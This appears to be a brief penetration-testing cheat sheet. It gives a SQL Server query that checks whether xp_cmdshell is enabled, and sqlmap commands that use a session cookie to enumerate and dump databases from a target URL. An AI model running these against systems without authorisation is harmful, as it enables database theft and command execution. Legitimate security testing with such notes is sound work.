**check whether xp_cmdshell is enabled in SQL Server**
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';


**Gaining Access - dumping the SQL Database using cookie SQL Map**
sqlmap -u "URL" --cookie="PHPSESSID=1234" --dbs
sqlmap -u "TARGET_URL" --cookie="SESSION_COOKIE" -D DATABASE_NAME -T TABLE_NAME --dump
